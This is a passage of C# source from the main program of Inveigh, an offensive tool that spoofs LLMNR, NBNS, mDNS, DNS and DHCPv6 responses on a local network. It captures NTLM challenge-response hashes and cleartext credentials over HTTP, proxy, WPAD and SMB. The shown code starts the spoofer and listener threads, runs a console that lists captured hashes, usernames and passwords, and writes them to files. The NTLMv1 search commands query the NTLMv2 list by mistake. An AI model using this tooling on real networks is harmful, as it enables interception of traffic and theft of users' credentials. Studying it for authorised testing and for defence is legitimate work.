                if (!String.IsNullOrEmpty(argDNSHost)) { outputList.Add(String.Format("[+] DNS Host = {0}", argDNSHost)); }
                outputList.Add(String.Format("[+] DNS TTL = {0}", argDNSTTL));  
            }
            else outputList.Add(String.Format("[+] DNS Spoofer = Disabled"));

            if (enabledLLMNR) optionStatus = "Enabled";
            else optionStatus = "Disabled";
            outputList.Add(String.Format("[+] LLMNR Spoofer = {0}", optionStatus));
            if (enabledLLMNRv6) optionStatus = "Enabled";
            else optionStatus = "Disabled";
            outputList.Add(String.Format("[+] LLMNRv6 Spoofer = {0}", optionStatus));
            if (enabledLLMNR || enabledLLMNRv6) { outputList.Add(String.Format("[+] LLMNR TTL = {0}", argLLMNRTTL)); }

            if (enabledMDNS)
            {
                outputList.Add(String.Format("[+] mDNS({0}) Spoofer For Types {1} = Enabled", String.Join(",", argMDNSQuestions), String.Join(",", argMDNSTypes)));
                outputList.Add(String.Format("[+] mDNS TTL = {0}", argMDNSTTL));
            }
            else outputList.Add(String.Format("[+] mDNS Spoofer = Disabled"));

            if (enabledNBNS)
            {
                outputList.Add(String.Format("[+] NBNS Spoofer For Types {0} = Enabled", String.Join(",", argNBNSTypes)));
                outputList.Add(String.Format("[+] NBNS TTL = {0}", argNBNSTTL));
            }
            else outputList.Add(String.Format("[+] NBNS Spoofer = Disabled"));

            if (enabledHTTP) optionStatus = "Enabled";
            else optionStatus = "Disabled";
            outputList.Add(String.Format("[+] HTTP Capture = {0}", optionStatus));

            if (enabledHTTP)
            {
                if (!String.IsNullOrEmpty(argChallenge)) outputList.Add(String.Format("[+] HTTP NTLM Challenge = {0}", argChallenge));
                outputList.Add(String.Format("[+] HTTP Authentication = {0}", argHTTPAuth));
                if (!String.Equals(argHTTPIP, "0.0.0.0")) outputList.Add(String.Format("[+] HTTP IP = {0}", argHTTPIP));
                if (!String.Equals(argHTTPPort, "80")) outputList.Add(String.Format("[+] HTTP Port = {0}", argHTTPPort));
                if (!String.IsNullOrEmpty(argHTTPResponse)) outputList.Add("[+] HTTP Response = Enabled");
            }

            if (String.Equals(argHTTPAuth, "BASIC") || String.Equals(argProxyAuth, "BASIC") || String.Equals(argWPADAuth, "BASIC")) { outputList.Add(String.Format("[+] Basic Authentication Realm = {0}", argHTTPBasicRealm)); }

            if (enabledProxy)
            {
                if (argPcapTCP != null && argPcapTCP.Length > 0) outputList.Add(String.Format("[+] Pcap TCP Ports = {0}", String.Join(",", argPcapTCP)));
                if (argPcapUDP != null && argPcapUDP.Length > 0) outputList.Add(String.Format("[+] Pcap UDP Ports = {0}", String.Join(",", argPcapUDP)));
            }

            if (enabledProxy) optionStatus = "Enabled";
            else optionStatus = "Disabled";
            outputList.Add(String.Format("[+] Proxy Capture = {0}", optionStatus));

            if (enabledProxy)
            {
                if (!String.Equals(argProxyIP, "0.0.0.0")) outputList.Add(String.Format("[+] Proxy IP = {0}", argProxyIP));
                outputList.Add(String.Format("[+] Proxy Port = {0}", argProxyPort));
            }

            outputList.Add(String.Format("[+] WPAD Authentication = {0}", argWPADAuth));
            if (argWPADAuth.StartsWith("NTLM")) outputList.Add(String.Format("[+] WPAD NTLM Authentication Ignore List = {0}", String.Join(",", argWPADAuthIgnore)));
            if (argWPADDirectHosts != null) outputList.Add(String.Format("[+] WPAD Direct Hosts = {0}", String.Join(",", argWPADDirectHosts)));
            if (!String.IsNullOrEmpty(argWPADIP)) outputList.Add(String.Format("[+] WPAD IP = {0}", argWPADIP));
            if (!String.IsNullOrEmpty(argWPADPort)) outputList.Add(String.Format("[+] WPAD Port = {0}", argWPADPort));
            if (enabledSMB) optionStatus = "Enabled";
            else optionStatus = "Disabled";
            outputList.Add(String.Format("[+] SMB Capture = {0}", optionStatus));
            if (enabledMachineAccounts) optionStatus = "Enabled";
            else optionStatus = "Disabled";
            outputList.Add(String.Format("[+] Machine Account Capture = {0}", optionStatus));
            if (enabledFileOutput) optionStatus = "Enabled";
            else optionStatus = "Disabled";
            outputList.Add(String.Format("[+] File Output = {0}", optionStatus));
            if (enabledLogOutput) optionStatus = "Enabled";
            else optionStatus = "Disabled";
            outputList.Add(String.Format("[+] Log Output = {0}", optionStatus));
            if (enabledPcap) optionStatus = "Enabled";
            else optionStatus = "Disabled";
            outputList.Add(String.Format("[+] Pcap Output = {0}", optionStatus));
            if (isSession) optionStatus = "Imported";
            else optionStatus = "Not Found";
            outputList.Add(String.Format("[+] Previous Session Files = {0}", optionStatus));
            if (enabledFileOutput) { outputList.Add(String.Format("[+] Output Directory = {0}", argFileOutputDirectory)); }
            if (runCount == 1) outputList.Add(String.Format("[+] Run Count = {0} Minute", runCount));
            else if (runCount > 1) outputList.Add(String.Format("[+] Run Count = {0} Minutes", runCount));
            if (runTime == 1) outputList.Add(String.Format("[+] Run Time = {0} Minute", runTime));
            else if (runTime > 1) outputList.Add(String.Format("[+] Run Time = {0} Minutes", runTime));
            outputList.Add(String.Format("[*] Press ESC to access console"));

            if (enabledElevated && (enabledDHCPv6 || enabledLLMNRv6|| enabledDNS || enabledMDNS || enabledLLMNR || enabledNBNS || enabledSMB))
            {

                if (enabledElevated && (enabledDNS || enabledMDNS || enabledLLMNR || enabledNBNS || enabledSMB))
                {
                    Thread snifferSpooferThread = new Thread(() => Sniffer.SnifferSpoofer("IPv4", argIP, argMAC, argSpooferIP, argSpooferIPv6, argDNSHost, argDNSTTL, argLLMNRTTL, argMDNSTTL, argNBNSTTL, argDNSTypes, argMDNSQuestions, argMDNSTypes, argNBNSTypes, argDHCPv6DNSSuffix, argPcapTCP, argPcapUDP));
                    snifferSpooferThread.Start();
                }

                if (!String.IsNullOrEmpty(argIPv6) && enabledElevated && (enabledDHCPv6 || enabledLLMNRv6))
                {
                    Thread snifferSpooferIPv6Thread = new Thread(() => Sniffer.SnifferSpoofer("IPv6", argIPv6, argMAC, argSpooferIP, argSpooferIPv6, argDNSHost, argDNSTTL, argLLMNRTTL, argMDNSTTL, argNBNSTTL, argDNSTypes, argMDNSQuestions, argMDNSTypes, argNBNSTypes, argDHCPv6DNSSuffix, argPcapTCP, argPcapUDP));
                    snifferSpooferIPv6Thread.Start();
                }

                if (!enabledInspect && !String.IsNullOrEmpty(argIPv6) && enabledDHCPv6 && dhcpv6RA > 0)
                {
                    Thread icmpv6Thread = new Thread(() => ICMPv6.icmpv6RouterAdvertise(argIPv6, dhcpv6RA));
                    icmpv6Thread.Start();
                }

            }
            else
            {

                if (enabledNBNS)
                {
                    Thread nbnsListenerThread = new Thread(() => NBNS.NBNSListener(argIP, argSpooferIP, argNBNSTTL, argNBNSTypes));
                    nbnsListenerThread.Start();
                }

                if (enabledLLMNR)
                {
                    Thread llmnrListenerThread = new Thread(() => LLMNR.LLMNRListener(argIP, argSpooferIP, argSpooferIPv6, argLLMNRTTL, "IPv4"));
                    llmnrListenerThread.Start();
                }

                if (enabledMDNS)
                {
                    Thread mdnsListenerThread = new Thread(() => MDNS.MDNSListener("IPv4", argIP, argSpooferIP, argSpooferIPv6, argMDNSTTL, argMDNSQuestions, argMDNSTypes));
                    mdnsListenerThread.Start();
                }

                if (enabledDHCPv6)
                {
                    Thread dnsListenerThread = new Thread(() => DHCPv6.DHCPv6Listener(argIPv6, argSpooferIPv6, argMAC, argDHCPv6DNSSuffix));
                    dnsListenerThread.Start();
                }

                if (enabledDNS)
                {
                    Thread dnsListenerThread = new Thread(() => DNS.DNSListener(argIP, argSpooferIP, argDNSTTL, argDNSHost, "IPv4", argDNSTypes));
                    dnsListenerThread.Start();

                    if(!String.IsNullOrEmpty(argIPv6))
                    {
                        Thread dnsListenerIPv6Thread = new Thread(() => DNS.DNSListener(argIPv6, argSpooferIP, argDNSTTL, argDNSHost, "IPv6", argDNSTypes));
                        dnsListenerIPv6Thread.Start();
                    }
                    
                }

            }

            if (enabledHTTP)
            {
                Thread httpListenerThread = new Thread(() => HTTP.HTTPListener(argHTTPIP, argHTTPPort, "IPv4", argChallenge, computerName, dnsDomain, netbiosDomain, argHTTPBasicRealm, argHTTPAuth, argHTTPResponse, argWPADAuth, argWPADResponse, argWPADAuthIgnore, argProxyIgnore, false));
                httpListenerThread.Start();

                Thread httpListenerIPv6Thread = new Thread(() => HTTP.HTTPListener(argHTTPIP, argHTTPPort, "IPv6", argChallenge, computerName, dnsDomain, netbiosDomain, argHTTPBasicRealm, argHTTPAuth, argHTTPResponse, argWPADAuth, argWPADResponse, argWPADAuthIgnore, argProxyIgnore, false));
                httpListenerIPv6Thread.Start();
            }

            if (enabledProxy)
            {
                Thread proxyListenerThread = new Thread(() => HTTP.HTTPListener(argProxyIP, argProxyPort, "IPv4", argChallenge, computerName, dnsDomain, netbiosDomain, argHTTPBasicRealm, argProxyAuth, argHTTPResponse, argWPADAuth, argWPADResponse, argWPADAuthIgnore, argProxyIgnore, true));
                proxyListenerThread.Start();
            }

            Thread controlThread = new Thread(() => ControlLoop(consoleQueueLimit, consoleStatus, runCount, runTime));
            controlThread.Start();

            if (enabledFileOutput)
            {
                Thread fileOutputThread = new Thread(() => FileOutput());
                fileOutputThread.Start();
            }

            while (true)
            {

                try
                {
                    OutputLoop();
                    Console.WriteLine("");
                    consoleOutput = false;
                    int x = Console.CursorLeft;
                    int y = Console.CursorTop;
                    Console.CursorTop = Console.WindowTop + Console.WindowHeight - 2;
                    Console.WriteLine("Type ? for console command list");
                    Console.Write("Inveigh>");
                    string inputCommand = Console.ReadLine();
                    Console.CursorTop = Console.WindowTop + Console.WindowHeight - 2;
                    Console.Write(new string(' ', Console.WindowWidth));
                    Console.CursorTop = Console.WindowTop + Console.WindowHeight - 3;
                    Console.Write(new string(' ', Console.WindowWidth));
                    Console.SetCursorPosition(x, y);
                    inputCommand = inputCommand.ToUpper();

                    switch (inputCommand)
                    {

                        case "GET CONSOLE":
                            Console.Clear();
                            {

                                while (consoleList.Count > 0)
                                {
                                    ConsoleOutputFormat(consoleList[0]);
                                    consoleList.RemoveAt(0);
                                }

                            }
                            break;

                        case "GET LOG":
                            Console.Clear();
                            string[] outputLog = logList.ToArray();

                            foreach (string entry in outputLog)
                            {
                                ConsoleOutputFormat(entry);
                            }
                            break;

                        case "GET CLEARTEXT":
                            Console.Clear();
                            string[] outputCleartext = cleartextList.ToArray();
                            foreach (string entry in outputCleartext)
                                Console.WriteLine(entry);
                            break;

                        case "GET CLEARTEXTUNIQUE":
                            Console.Clear();
                            Util.GetCleartextUnique();
                            break;

                        case "GET DHCPV6":
                            Console.Clear();
                            string[] outputHost = hostList.ToArray();
                            foreach (string entry in outputHost)
                                Console.WriteLine(entry);
                            break;

                        case "GET NTLMV1":
                            Console.Clear();
                            string[] outputNTLMV1 = ntlmv1List.ToArray();
                            foreach (string entry in outputNTLMV1)
                                Console.WriteLine(entry);
                            break;

                        case "GET NTLMV1UNIQUE":
                            Console.Clear();
                            Util.GetNTLMv1Unique();
                            break;

                        case "GET NTLMV1USERNAMES":
                            Console.Clear();
                            Util.GetNTLMv1Usernames();
                            break;

                        case "GET NTLMV2":
                            Console.Clear();
                            string[] outputNTLMV2 = ntlmv2List.ToArray();
                            foreach (string entry in outputNTLMV2)
                                Console.WriteLine(entry);
                            break;

                        case "GET NTLMV2UNIQUE":
                            Console.Clear();
                            Util.GetNTLMv2Unique();
                            break;

                        case "GET NTLMV2USERNAMES":
                            Console.Clear();
                            Util.GetNTLMv2Usernames();
                            break;

                        case "?":
                        case "HELP":
                            Console.Clear();
                            Console.WriteLine("");
                            Console.WriteLine("==============================================================================================================");
                            Console.WriteLine(" Inveigh Console Commands");
                            Console.WriteLine("==============================================================================================================\n");
                            Console.WriteLine("  GET CONSOLE                   | get queued console output");
                            Console.WriteLine("  GET DHCPv6                    | get DHCPv6 assigned IPv6 addresses");
                            Console.WriteLine("  GET LOG                       | get log entries; add search string to filter results");
                            Console.WriteLine("  GET NTLMV1                    | get captured NTLMv1 hashes; add search string to filter results");
                            Console.WriteLine("  GET NTLMV2                    | get captured NTLMv2 hashes; add search string to filter results");
                            Console.WriteLine("  GET NTLMV1UNIQUE              | get one captured NTLMv1 hash per user; add search string to filter results");
                            Console.WriteLine("  GET NTLMV2UNIQUE              | get one captured NTLMv2 hash per user; add search string to filter results");
                            Console.WriteLine("  GET NTLMV1USERNAMES           | get usernames and source IPs/hostnames for captured NTLMv1 challenge/response hashes");
                            Console.WriteLine("  GET NTLMV2USERNAMES           | get usernames and source IPs/hostnames for captured NTLMv2 challenge/response hashes");
                            Console.WriteLine("  GET CLEARTEXT                 | get captured cleartext credentials");
                            Console.WriteLine("  GET CLEARTEXTUNIQUE           | get unique captured cleartext credentials");
                            Console.WriteLine("  RESUME                        | resume real time console output");
                            Console.WriteLine("  STOP                          | stop Inveigh\n");
                            Console.WriteLine("==============================================================================================================");
                            break;

                        case "RESUME":
                            consoleOutput = true;
                            break;

                        case "STOP":
                            exitInveigh = true;
                            StopInveigh();
                            break;

                        default:
                            if (inputCommand.StartsWith("GET "))
                            {
                                string[] inputArray = inputCommand.Split(' ');

                                if (inputArray != null && inputArray.Length == 3)
                                {

                                    switch (inputArray[1])
                                    {

                                        case "LOG":
                                            Console.Clear();
                                            var outputLogSearch = logList.Where(element => CultureInfo.CurrentCulture.CompareInfo.IndexOf(element, inputArray[2], CompareOptions.IgnoreCase) >= 0).ToList();

                                            if (outputLogSearch.Count > 0)
                                            {

                                                foreach (string entry in outputLogSearch)
                                                {
                                                    Console.WriteLine(entry);
                                                }

                                            }
                                            else
                                            {
                                                Console.WriteLine("no results");
                                            }

                                            break;

                                        case "NTLMV1":
                                            Console.Clear();
                                            var outputNTLMV1Search = ntlmv2List.Where(element => CultureInfo.CurrentCulture.CompareInfo.IndexOf(element, inputArray[2], CompareOptions.IgnoreCase) >= 0).ToList();

                                            if (outputNTLMV1Search.Count > 0)
                                            {

                                                foreach (string entry in outputNTLMV1Search)
                                                {
                                                    Console.WriteLine(entry);
                                                }

                                            }
                                            else
                                            {
                                                Console.WriteLine("no results");
                                            }

                                            break;

                                        case "NTLMV1UNIQUE":
                                            Console.Clear();
                                            var outputNTLMV1UniqueSearch = ntlmv2List.Where(element => CultureInfo.CurrentCulture.CompareInfo.IndexOf(element, inputArray[2], CompareOptions.IgnoreCase) >= 0).ToList();

                                            if (outputNTLMV1UniqueSearch.Count > 0)
                                            {
                                                Console.WriteLine(outputNTLMV1UniqueSearch[0]);
                                                Console.WriteLine("{0} matches", outputNTLMV1UniqueSearch.Count);
                                            }
                                            else
                                            {
                                                Console.WriteLine("no results");
                                            }

                                            break;

                                        case "NTLMV2":
                                            Console.Clear();
                                            var outputNTLMV2Search = ntlmv2List.Where(element => CultureInfo.CurrentCulture.CompareInfo.IndexOf(element, inputArray[2], CompareOptions.IgnoreCase) >= 0).ToList();

                                            if (outputNTLMV2Search.Count > 0)
                                            {

                                                foreach (string entry in outputNTLMV2Search)
                                                {
                                                    Console.WriteLine(entry);
                                                }

                                            }
                                            else
                                            {
                                                Console.WriteLine("no results");
                                            }

                                            break;

                                        case "NTLMV2UNIQUE":
                                            Console.Clear();
                                            var outputNTLMV2UniqueSearch = ntlmv2List.Where(element => CultureInfo.CurrentCulture.CompareInfo.IndexOf(element, inputArray[2], CompareOptions.IgnoreCase) >= 0).ToList();

                                            if (outputNTLMV2UniqueSearch.Count > 0)
                                            {
                                                Console.WriteLine(outputNTLMV2UniqueSearch[0]);
                                                Console.WriteLine("{0} matches", outputNTLMV2UniqueSearch.Count);
                                            }
                                            else
                                            {
                                                Console.WriteLine("no results");
                                            }

                                            break;

                                        default:
                                            Console.WriteLine("Invalid Command");
                                            break;

                                    }

                                }
                                else
                                {
                                    Console.WriteLine("Invalid Command");
                                }

                            }
                            else
                                Console.WriteLine("Invalid Command");
                            break;
                    }

                    System.Threading.Thread.Sleep(5);
                }
                catch (Exception ex)
                {
                    Console.WriteLine(outputList.Count);
                    Program.outputList.Add(String.Format("[-] [{0}] Console error detected - {1}", DateTime.Now.ToString("s"), ex.ToString()));                 
                }

            }

        }

        static void FileOutput()
        {

            while (true)
            {

                if (logFileList.Count > 0)
                {

                    using (StreamWriter outputFileLog = new StreamWriter(Path.Combine(argFileOutputDirectory, String.Concat(argFilePrefix, "-Log.txt")), true))
                    {
                        outputFileLog.WriteLine(logFileList[0]);
                        outputFileLog.Close();

                        lock (logFileList)
                        {
                            logFileList.RemoveAt(0);
                        }

                    }

                }

                if (cleartextFileList.Count > 0)
                {

                    using (StreamWriter outputFileCleartext = new StreamWriter(Path.Combine(argFileOutputDirectory, String.Concat(argFilePrefix, "-Cleartext.txt")), true))
                    {
                        outputFileCleartext.WriteLine(cleartextFileList[0]);
                        outputFileCleartext.Close();

                        lock (cleartextFileList)
                        {
                            cleartextFileList.RemoveAt(0);
                        }

                    }

                }

                if (ntlmv1FileList.Count > 0)
                {

                    using (StreamWriter outputFileNTLMv1 = new StreamWriter(Path.Combine(argFileOutputDirectory, String.Concat(argFilePrefix, "-NTLMv1.txt")), true))
                    {
                        outputFileNTLMv1.WriteLine(ntlmv1FileList[0]);
                        outputFileNTLMv1.Close();

                        lock (ntlmv1FileList)
                        {
                            ntlmv1FileList.RemoveAt(0);
                        }

                    }

                }

                if (ntlmv2FileList.Count > 0)
                {

                    using (StreamWriter outputFileNTLMv2 = new StreamWriter(Path.Combine(argFileOutputDirectory, String.Concat(argFilePrefix, "-NTLMv2.txt")), true))
                    {
                        outputFileNTLMv2.WriteLine(ntlmv2FileList[0]);
                        outputFileNTLMv2.Close();

                        lock (ntlmv2FileList)
                        {
                            ntlmv2FileList.RemoveAt(0);
                        }

                    }

                }

                if (ntlmv1UsernameFileList.Count > 0)
                {

                    using (StreamWriter outputUsernameFileNTLMv1 = new StreamWriter(Path.Combine(argFileOutputDirectory, String.Concat(argFilePrefix, "-NTLMv1Users.txt")), true))
                    {
                        outputUsernameFileNTLMv1.WriteLine(ntlmv1UsernameFileList[0]);
                        outputUsernameFileNTLMv1.Close();

                        lock (ntlmv1UsernameList)
                        {
                            ntlmv1UsernameFileList.RemoveAt(0);
                        }

                    }

                }

                if (ntlmv2UsernameFileList.Count > 0)
                {

                    using (StreamWriter outputUsernameFileNTLMv2 = new StreamWriter(Path.Combine(argFileOutputDirectory, String.Concat(argFilePrefix, "-NTLMv2Users.txt")), true))
                    {
                        outputUsernameFileNTLMv2.WriteLine(ntlmv2UsernameFileList[0]);
                        outputUsernameFileNTLMv2.Close();

                        lock (ntlmv2UsernameFileList)
                        {
                            ntlmv2UsernameFileList.RemoveAt(0);
                        }

                    }

                }

                if (hostFileList.Count > 0)
                {

                    using (StreamWriter outputDHCPv6File = new StreamWriter(Path.Combine(argFileOutputDirectory, String.Concat(argFilePrefix, "-DHCPv6.txt")), true))
                    {
                        outputDHCPv6File.WriteLine(hostFileList[0]);
                        outputDHCPv6File.Close();

                        lock (hostFileList)
                        {
                            hostFileList.RemoveAt(0);
                        }

                    }

                }

                Thread.Sleep(100);
            }

        }

        static void OutputLoop()
        {
            bool keyDetect = true;
            bool keyPressed = false;

            do
            {

                while (consoleOutput && !keyPressed)
                {

                    try
                    {

                        if (keyDetect && Console.KeyAvailable)
                        {
                            keyPressed = true;
                        }

                    }
                    catch { keyDetect = false; }

                    while (consoleList.Count > 0)
                    {
                        ConsoleOutputFormat(consoleList[0]);
                        consoleList.RemoveAt(0);
                    }

                    System.Threading.Thread.Sleep(5);
                }
            } while (consoleOutput && Console.ReadKey(true).Key != ConsoleKey.Escape);

        }

        static void ConsoleOutputFormat(string consoleEntry)
        {

            if(String.IsNullOrEmpty(consoleEntry))
            {
                consoleEntry = "";
            }

            if (consoleEntry.StartsWith("[*]") || consoleEntry.Contains("captured") || consoleEntry.Contains("renewed to") || consoleEntry.Contains("leased to") || consoleEntry.Contains("advertised to") || 
                consoleEntry.Contains("[not unique]") || consoleEntry.Contains("[redacted]") || (!consoleEntry.StartsWith("[+] ") && !consoleEntry.StartsWith("[*] ") && !consoleEntry.StartsWith("[!] ") && 
                !consoleEntry.StartsWith("[-] ")) && !consoleEntry.Contains("[machine account]"))
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine(consoleEntry);
                Console.ResetColor();
            }
            else if (consoleEntry.StartsWith("[-]"))
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine(consoleEntry);
                Console.ResetColor();
            }
            else if (consoleEntry.StartsWith("[!]") || consoleEntry.Contains(" ignored ") || consoleEntry.Contains("[machine account]"))
            {
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine(consoleEntry);
                Console.ResetColor();
            }
            else if (consoleEntry.Contains("[response sent]") || consoleEntry.Contains("[advertised ") || consoleEntry.Contains("[assigned "))
            {
                int outputIndex = (consoleEntry.Substring(5)).IndexOf("[") + 6;
                string outputStart = consoleEntry.Substring(0, outputIndex);
                string outputEnd = consoleEntry.Substring(outputIndex).Replace("]", "");
                Console.Write(outputStart);
                Console.ForegroundColor = ConsoleColor.Green;
                Console.Write(outputEnd);
                Console.ResetColor();
                Console.WriteLine("]");
            }
            else
            {
                Console.WriteLine(consoleEntry);
            }

        }

        static void ControlLoop(int consoleQueueLimit, int consoleStatus, int runCount, int runTime)
        {
            Stopwatch stopwatchConsoleStatus = new Stopwatch();
            stopwatchConsoleStatus.Start();
            Stopwatch stopwatchRunTime = new Stopwatch();
            stopwatchRunTime.Start();

            while (true)
            {

                if (consoleStatus > 0 && consoleOutput && stopwatchConsoleStatus.Elapsed.Minutes >= consoleStatus)
                {
                    Util.GetCleartextUnique();
                    Util.GetNTLMv1Unique();
                    Util.GetNTLMv1Usernames();
                    Util.GetNTLMv2Unique();
                    Util.GetNTLMv2Usernames();
                    stopwatchConsoleStatus.Reset();
                    stopwatchConsoleStatus.Start();
                }

                if (runTime > 0 && consoleOutput && stopwatchRunTime.Elapsed.Minutes >= runTime)
                {
                    outputList.Add(String.Format("[*] {0} Inveigh is exiting due to reaching run time", DateTime.Now.ToString("s")));
                    exitInveigh = true;
                    StopInveigh();
                }

                if (runCount > 0 && consoleOutput && (ntlmv1List.Count >= runCount || ntlmv2List.Count >= runCount))
                {
                    outputList.Add(String.Format("[*] {0} Inveigh is exiting due to reaching run count", DateTime.Now.ToString("s")));
                    exitInveigh = true;
                    StopInveigh();
                }

                try
                {

                    while (outputList.Count > 0)
                    {

                        consoleList.Add(outputList[0]);

                        if (enabledLogOutput)
                        {
                            logList.Add(outputList[0]);
                        }

                        if (outputList[0].StartsWith("[+] ") || outputList[0].StartsWith("[*] ") || outputList[0].StartsWith("[!] ") || outputList[0].StartsWith("[-] "))
                        {
                            logFileList.Add(outputList[0]);
                        }
                        else
                        {
                            logFileList.Add("[redacted]");
                        }

                        lock (outputList)
                        {
                            outputList.RemoveAt(0);
                        }

                    }

                    if (!consoleOutput && consoleQueueLimit >= 0)
                    {

                        while (consoleList.Count > consoleQueueLimit && !consoleOutput)
                        {
                            consoleList.RemoveAt(0);
                        }

                    }

                    if (exitInveigh && consoleOutput)
                    {
                        while (consoleList.Count > 0)
                        {
                            System.Threading.Thread.Sleep(5);
                        }

                        Environment.Exit(0);
                    }

                }
                catch (Exception ex)
                {
                    Program.outputList.Add(String.Format("[-] [{0}] Output error detected - {1}", DateTime.Now.ToString("s"), ex.ToString()));
                }

                Thread.Sleep(5);
            }

        }

        static void StopInveigh()
        {

            if (Sniffer.pcapFile != null)
            {
                Sniffer.pcapFile.Close();
                Sniffer.pcapFile.Dispose();
            }

            Console.WriteLine(String.Format("[+] Inveigh exited at {0}", DateTime.Now.ToString("s")));
            Environment.Exit(0);
        }

        static void GetHelp(string arg)
        {
            bool nullarg = true;

            Console.WriteLine("");

            if (String.IsNullOrEmpty(arg))
            {
                Console.WriteLine("args:\n");
            }
            else
            {
                Console.WriteLine("arg:\n");
                nullarg = false;
            }

            if (nullarg || String.Equals(arg, "CHALLENGE"))
            {
                Console.WriteLine(" -Challenge               Default = Random: 16 character hex NTLM challenge for use with the HTTP listener.");
                Console.WriteLine("                          If left blank, a random challenge will be generated for each request.");
            }

            if (nullarg || String.Equals(arg, "CONSOLESTATUS"))
            {
                Console.WriteLine(" -ConsoleStatus           Default = Disabled: Interval in minutes for displaying all unique captured usernames,");
                Console.WriteLine("                          hashes, and credentials.");
            }

            if (nullarg || String.Equals(arg, "DHCPV6"))
            {
                Console.WriteLine(" -DHCPv6                  Default = Disabled: (Y/N) Enable/Disable DHCPv6 spoofing.");
            }

            if (nullarg || String.Equals(arg, "DHCPV6Local"))
            {
                Console.WriteLine(" -DHCPv6Local             Default = Disabled: (Y/N) Enable/Disable spoofing DHCPv6 packets from the Inveigh host.");
            }

            if (nullarg || String.Equals(arg, "DHCPV6DNSSUFFIX"))
            {
                Console.WriteLine(" -DHCPv6DNSSuffix         DNS search suffix to include in DHCPv6 responses.");
            }

            if (nullarg || String.Equals(arg, "DHCPV6RA"))
            {
                Console.WriteLine(" -DHCPv6RA                Default = 30 Seconds: DHCPv6 ICMPv6 router advertise interval. Set to 0 to disable.");
            }

            if (nullarg || String.Equals(arg, "DNS"))
            {
                Console.WriteLine(" -DNS                     Default = Enabled: (Y/N) Enable/Disable DNS spoofing.");
            }

            if (nullarg || String.Equals(arg, "DNSHOSTNAME"))
            {
                Console.WriteLine(" -DNSHost                 Fully qualified hostname to use SOA/SRV responses.");
            }

            if (nullarg || String.Equals(arg, "DNSTTL"))
            {
                Console.WriteLine(" -DNSTTL                  Default = 30 Seconds: DNS TTL in seconds for the response packet.");
            }

            if (nullarg || String.Equals(arg, "DNSTYPES"))
            {
                Console.WriteLine(" -DNSTypes                Default = A: Comma separated list of DNS types to spoof. Types include A, SOA, and SRV");
            }

            if (nullarg || String.Equals(arg, "ELEVATEDPRIVILEGE"))
            {
                Console.WriteLine(" -Elevated                Default = Y: (Y/N) Set the privilege mode. Elevated privilege features require an");
                Console.WriteLine("                          elevated administrator shell.");
            }

            if (nullarg || String.Equals(arg, "FILEOUTPUT"))
            {
                Console.WriteLine(" -FileOutput              Default = Disabled: (Y/N) Enable/Disable real time file output.");
            }

            if (nullarg || String.Equals(arg, "FILEOUTPUTDIRECTORY"))
            {
                Console.WriteLine(" -FileOutputDirectory     Default = Working Directory: Valid path to an output directory for log and capture");
                Console.WriteLine("                          files. FileOutput must also be enabled.");
            }

            if (nullarg || String.Equals(arg, "FILEPREFIX"))
            {
                Console.WriteLine(" -FilePrefix              Default = Inveigh: Prefix for all output files.");
            }

            if (nullarg || String.Equals(arg, "FILEUNIQUE"))
            {
                Console.WriteLine(" -FileUnique              Default = Enabled: (Y/N) Enable/Disable outputting challenge/response hashes for");
                Console.WriteLine("                          only unique IP, domain/hostname, and username combinations when real time file");
                Console.WriteLine("                          output is enabled.");
            }

            if (nullarg || String.Equals(arg, "HTTP"))
            {
                Console.WriteLine(" -HTTP                    Default = Enabled: (Y/N) Enable/Disable HTTP challenge/response capture.");
            }

            if (nullarg || String.Equals(arg, "HTTPAUTH"))
            {
                Console.WriteLine(" -HTTPAuth                Default = NTLM: (Anonymous/Basic/NTLM/NTLMNoESS) HTTP/HTTPS listener authentication");
                Console.WriteLine("                          type. This setting does not apply to wpad.dat requests. NTLMNoESS turns off the");
                Console.WriteLine("                          'Extended Session Security' flag during negotiation.");
            }

            if (nullarg || String.Equals(arg, "HTTPIP"))
            {
                Console.WriteLine(" -HTTPIP                  Default = Any: IP address for the HTTP/HTTPS listener.");
            }

            if (nullarg || String.Equals(arg, "HTTPPORT"))
            {
                Console.WriteLine(" -HTTPPort                Default = 80: TCP port for the HTTP listener.");
            }

            if (nullarg || String.Equals(arg, "HTTPRESPONSE"))
            {
                Console.WriteLine(" -HTTPResponse            Content to serve as the default HTTP/HTTPS/Proxy response. This response will not be");
                Console.WriteLine("                          used for wpad.dat requests. This parameter will not be used if HTTPDir is set. Use C#");
                Console.WriteLine("                          character escapes and newlines where necessary.");
            }

            if (nullarg || String.Equals(arg, "INSPECT"))
            {
                Console.WriteLine(" -Inspect                 (Switch) Inspect DNS/LLMNR/mDNS/NBNS/SMB traffic only.");
            }

            if (nullarg || String.Equals(arg, "IP"))
            {
                Console.WriteLine(" -IP                      Local IP address for listening and packet sniffing. This IP address will also be");
                Console.WriteLine("                          used for spoofing if the SpooferIP arg is not set.");
            }

            if (nullarg || String.Equals(arg, "IPV6"))
            {
                Console.WriteLine(" -IPv6                    Local IPv6 address for listening and packet sniffing. This IP address will also be");
                Console.WriteLine("                          used for spoofing if the SpooferIPv6 arg is not set.");
            }

            if (nullarg || String.Equals(arg, "LLMNR"))
            {
                Console.WriteLine(" -LLMNR                   Default = Enabled: (Y/N) Enable/Disable LLMNR spoofing.");
            }

            if (nullarg || String.Equals(arg, "LLMNRv6"))
            {
                Console.WriteLine(" -LLMNRv6                 Default = Disabled: (Y/N) Enable/Disable IPv6 LLMNR spoofing.");
            }

            if (nullarg || String.Equals(arg, "LLMNRTTL"))
            {
                Console.WriteLine(" -LLMNRTTL                Default = 30 Seconds: LLMNR TTL in seconds for the response packet.");
            }

            if (nullarg || String.Equals(arg, "MAC"))
            {
                Console.WriteLine(" -MAC                     Local MAC address for IPv6.");
            }

            if (nullarg || String.Equals(arg, "MACHINEACCOUNTS"))
            {
                Console.WriteLine(" -MachineAccounts         Default = Disabled: (Y/N) Enable/Disable showing NTLM challenge/response captures");
                Console.WriteLine("                          from machine accounts.");
            }

            if (nullarg || String.Equals(arg, "MDNS"))
            {
                Console.WriteLine(" -mDNS                    Default = Disabled: (Y/N) Enable/Disable mDNS spoofing.");
            }

            if (nullarg || String.Equals(arg, "MDNSTTL"))
            {
                Console.WriteLine(" -mDNSTTL                 Default = 120 Seconds: mDNS TTL in seconds for the response packet.");
            }

            if (nullarg || String.Equals(arg, "MDNSQuestions"))
            {
